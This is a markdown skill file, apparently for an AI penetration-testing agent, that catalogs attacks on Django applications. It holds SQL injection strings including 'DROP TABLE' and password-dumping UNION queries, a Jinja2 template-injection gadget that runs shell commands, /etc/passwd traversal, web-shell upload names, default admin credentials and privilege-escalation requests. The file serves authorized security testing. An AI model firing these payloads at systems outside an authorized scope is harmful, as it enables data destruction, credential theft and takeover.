---
name: django
description: Django security testing covering admin exposure, ORM injection, mass assignment, template injection, and middleware bypass
---

# Django

Security testing for Django applications. Focus on admin panel exposure, ORM-based SQL injection, mass assignment via forms, template injection, and authentication bypass through middleware gaps.

## Attack Surface

**Core Components**
- WSGI/ASGI request handling, middleware pipeline, URL routing
- ORM: QuerySets, raw SQL endpoints, annotation/aggregation
- Forms: ModelForms, validation, cleaning, field widgets
- Templates: Django Template Language (DTL), Jinja2 if used
- Admin: ModelAdmin, inlines, actions, custom admin views
- Authentication: User model, permissions, groups, sessions, decorators
- File uploads: FileField, ImageField, storage backends
- Cache framework: cache middleware, template fragment caching

**Integration Points**
- Django REST Framework (DRF): serializers, ViewSets, permissions
- Channels: WebSocket consumers
- Celery: task queues, background jobs

**Deployment**
- WSGI servers: Gunicorn, uWSGI
- ASGI servers: Daphne, Hypercorn
- Static/media file serving

## High-Value Targets

- `/admin/` - Django admin panel (often exposed with weak credentials)
- `/admin/login/` - Admin authentication
- `/static/admin/` - Static files revealing Django version
- `/media/` - User uploaded files
- API endpoints (`/api/`, `/rest/`) - DRF endpoints
- `/login/`, `/logout/`, `/password_reset/` - Authentication flows
- `/signup/`, `/register/` - User registration
- File upload endpoints (`/upload/`, `/avatar/`)
- Export endpoints (`/export/`, `/download/`, `/csv/`)
- Debug endpoints (if DEBUG=True): error pages with stack traces
- `/__debug__/` - Django Debug Toolbar
- `/sitemap.xml`, `/robots.txt` - Information disclosure

## Reconnaissance

**Django Fingerprinting**
- CSRF token format: 32-character alphanumeric (e.g., `csrftoken=abc123...`)
- Session cookie name: `sessionid` (default) or custom
- Error pages: Yellow Django error page with stack trace (DEBUG mode)
- Static files: `/static/admin/css/base.css`, `/static/rest_framework/`
- Admin panel: `/admin/`, `/django-admin/`, `/cms/admin/`, `/backend/`
- Server header: `WSGIServer/0.2 CPython/x.x.x`

**Technology Detection**
```
GET /admin/login/?next=/admin/
GET /static/admin/css/base.css
GET / (check for csrftoken cookie)
GET /api/ (check for DRF browsable API styling)
GET /nonexistent (trigger 404, check error page style)
```

**Settings Discovery (Black-Box)**
- Trigger errors to check for DEBUG mode exposure
- Test for common settings file paths:
  - `/.env`
  - `/.git/config`
  - `/settings.py`
  - `/config/settings/local.py`
  - `/local_settings.py`

**Admin Discovery**
```
GET /admin/
GET /administrator/
GET /django-admin/
GET /backend/
GET /manage/
GET /cms/admin/
```

## Key Vulnerabilities

### Admin Panel Exposure

**Access Testing**
- Test default/weak credentials: `admin/admin`, `admin/password`, `admin/django`, `admin/123456`
- Check for exposed admin at non-standard paths
- Test for disabled authentication (open admin)

**Privilege Escalation via Admin**
```
POST /admin/auth/user/1/change/
POST /admin/auth/user/add/
```
Test mass assignment in admin forms:
- Add `is_superuser=true`, `is_staff=true` to form data
- Add `groups=1` or `user_permissions=1` to assign admin groups

**Admin Actions Abuse**
- Look for custom admin actions without permission checks
- Test bulk actions on other users' data

### ORM Injection

**Order By Injection**
```
GET /users/?order=username
GET /users/?order=username' OR '1'='1
GET /users/?order=id; SELECT pg_sleep(5)--
GET /users/?order=username; DROP TABLE users;--
```

**Raw SQL Endpoints**
If application exposes raw SQL or search functionality:
```
GET /search/?q=admin' UNION SELECT username,password FROM auth_user--
GET /search/?q=' OR '1'='1'--
```

**Dictionary Expansion**
Test filter parameters for dictionary unpacking:
```
GET /api/users/?is_superuser=true
GET /api/users/?is_staff=true&is_superuser=true
GET /api/users/?groups__name=Admin
```

### Mass Assignment

**ModelForm Abuse**
Submit all model fields in forms (including hidden ones):
```
POST /profile/edit/
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=...&username=victim&is_superuser=true&is_staff=true&groups=1
```

**DRF Serializer Mass Assignment**
```
PATCH /api/users/1/
Content-Type: application/json

{"is_superuser": true, "is_staff": true, "groups": [1]}
```

**Registration Form Abuse**
```
POST /register/
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=...&username=attacker&password=pass&is_superuser=true&is_staff=true
```

### Template Injection (SSTI)

**Django Template Language (DTL) Probes**
```
{{7*7}}
{{settings.SECRET_KEY}}
{{user.password}}
{{user.groups.all}}
{% debug %}
```

**Context Data Extraction**
```
{{request.build_absolute_uri}}
{{request.META}}
{{settings.DATABASES}}
{{settings.SECRET_KEY}}
```

**Jinja2 (if used)**
```
{{7*7}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Authentication & Authorization

**User Impersonation**
Test user ID parameter switching:
```
GET /profile/1/  (admin profile)
GET /profile/2/  (switch to user 2)
GET /user/1/change/
```

**Session Fixation**
- Capture sessionid cookie before login
- Login with captured session
- Verify if session ID changes (should rotate)

**CSRF Token Bypass**
```
POST /transfer/
Content-Type: application/json
X-CSRFToken: invalid_token

{"amount": 1000, "to": "attacker"}
```

Test without CSRF token:
```
POST /api/action/
Content-Type: application/json
Authorization: Bearer <token>

{"action": "delete"}
```

**Cookie Attributes**
Check for insecure cookie settings:
```
# Session cookie without Secure flag (over HTTP)
# Session cookie without HttpOnly (accessible via JavaScript)
# CSRF cookie without SameSite protection
```

### File Upload Vulnerabilities

**Path Traversal in Filenames**
```
POST /upload/
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
Content-Type: text/plain

file_content
------boundary--
```

**Extension Bypass**
```
shell.jpg.php
shell.php.jpg
shell.php%00.jpg
shell.JpG
shell.pHp
```

**Direct File Access**
```
GET /media/uploads/../../../etc/passwd
GET /media/secret_document.pdf
GET /media/config/settings.py
```

### CSRF & Clickjacking

**CSRF Protection Bypass**
- Test endpoints with `@csrf_exempt` decorator
- Check for missing `CsrfViewMiddleware` in response headers
- Test with invalid or missing CSRF tokens

**Clickjacking**
Check for missing X-Frame-Options header:
```
GET /sensitive-page/
# Look for: X-Frame-Options: DENY or SAMEORIGIN
```

### DRF (Django REST Framework) Vulnerabilities

**Browsable API Exposure**
```
GET /api/
Accept: text/html
# Check if DRF browsable API is enabled in production
```

**Throttling Bypass**
```
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 2.2.2.2, 3.3.3.3
```

**Pagination IDOR**
```
GET /api/users/?page=2&page_size=100
GET /api/users/?offset=100&limit=100
```

**Serializer Field Abuse**
```
GET /api/users/?fields=password,is_superuser
GET /api/users/?include=password_hash
```

### Middleware Bypass

**Header Injection**
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
X-Real-IP: 127.0.0.1
```

**Path Normalization**
```
GET /admin//login
GET /admin/./login
GET /admin/../admin/login
GET /api//users/1/
```

**Method Override**
```
POST /api/users/1/ HTTP/1.1
X-HTTP-Method-Override: DELETE
```

### Cache Poisoning

**Cache Key Injection**
```
GET /page/?username=../../../admin
GET /page/?v=1../../admin
```

**Vary Header Bypass**
```
GET /api/user/
Cookie: sessionid=attacker_session
# Check if cached response leaks to other users
```

### Settings & Configuration Exposure

**DEBUG Mode Detection**
- Trigger 404 error: `GET /nonexistent-page/`
- Check for Django's yellow error page with stack trace
- Look for `SECRET_KEY`, database passwords, or AWS keys in error output

**Static File Misconfiguration**
```
GET /static/.env
GET /media/.git/config
GET /static/../../../etc/passwd
```

## Bypass Techniques

**Content-Type Switching**
```
application/json
application/x-www-form-urlencoded
multipart/form-data
text/plain
```

**Parameter Pollution**
```
GET /api/users/?id=1&id=2&id=3
GET /api/users/?is_staff=true&is_staff=false
```

**Case Variations**
```
GET /admin/ → GET /ADMIN/
GET /api/users/ → GET /API/USERS/
Cookie: sessionid=... → Cookie: SESSIONID=...
```

**Unicode Normalization**
```
?order=username%u0027%20OR%20%u00271%u0027=%u00271
```

**Path Traversal in URLs**
```
GET /static/..%2f..%2fetc/passwd
GET /media/%2e%2e/%2e%2e/config/settings.py
```

**CSRF Token Reuse**
- Extract valid CSRF token from one form
- Use same token in cross-site POST request
- Test if token is bound to session or reusable

## Testing Methodology

1. **Fingerprint Django**
   - Check for CSRF cookie, session cookie patterns
   - Trigger error to detect DEBUG mode
   - Identify admin panel location

2. **Admin Panel Testing**
   - Test common/weak credentials
   - Attempt mass assignment in user edit forms
   - Test custom admin actions for authorization gaps

3. **ORM Injection Testing**
   - Test `order` parameter with SQL injection payloads
   - Check search endpoints for raw SQL exposure
   - Test filter parameters for dictionary expansion

4. **Mass Assignment Testing**
   - Submit all model fields in forms (including hidden)
   - Test DRF PATCH/PUT endpoints with privileged fields
   - Check registration forms for role assignment

5. **Template Injection Testing**
   - Inject DTL syntax in all input fields
   - Test for context data exposure (`{{settings.SECRET_KEY}}`)
   - Check Jinja2 endpoints if applicable

6. **Authentication Testing**
   - Test user impersonation via ID parameters
   - Check session fixation (session rotation after login)
   - Test CSRF token validation bypass

7. **File Upload Testing**
   - Path traversal in filenames (`../../../etc/passwd`)
   - Extension bypass techniques
   - Direct file access via media URLs

8. **API Testing (DRF)**
   - Check for browsable API in production
   - Test throttling bypass via X-Forwarded-For
   - Verify pagination-based IDOR

## Validation Requirements

- Show SQL injection extracting data via `order` parameter or error-based detection
- Demonstrate mass assignment elevating privileges (is_superuser, is_staff)
- Prove SSTI extracting `SECRET_KEY` or sensitive context data
- Document admin panel access with unauthorized privilege escalation
- Show IDOR via user ID parameter switching
- Validate CSRF bypass on state-changing endpoints
- Demonstrate file path traversal in uploads or media access

## False Positives

- Django's built-in SQL parameterization (QuerySet filters) appearing in error messages
- Template auto-escaping preventing XSS (not SSTI)
- Admin panel requiring authentication (expected behavior)
- Static file 404 errors without sensitive content
- CSRF token validation errors without actual CSRF vulnerability

## Impact

- Database compromise via ORM injection
- Privilege escalation to superuser via mass assignment
- Settings exposure via template injection (SECRET_KEY, database credentials)
- Complete system takeover via admin panel
- Session hijacking via exposed SECRET_KEY
- Data breach via IDOR and unauthorized access
- Remote code execution via template injection or deserialization

## Pro Tips

1. Always check `/admin/` first - easy win with common credentials
2. Test `order` parameter on list views - often overlooked SQL injection point
3. Include `is_superuser=true`, `is_staff=true` in every form submission
4. Check for DEBUG mode by visiting non-existent URLs
5. Test DRF PATCH endpoints with mass assignment payloads
6. Try to access uploaded files directly via `/media/` URLs
7. Verify CSRF tokens rotate between sessions
8. Test for path traversal in filename parameters with URL encoding
9. Check for exposed settings in template context (`{{settings.*}}`)
10. Test admin actions for permission bypasses (bulk delete, mass update)

## Summary

Django provides security features by default, but misconfigurations are common. Focus on admin panel security, ORM-based SQL injection through order/filters, mass assignment in forms and DRF endpoints, and proper authorization checks. Test for DEBUG mode exposure early - it reveals critical settings instantly.
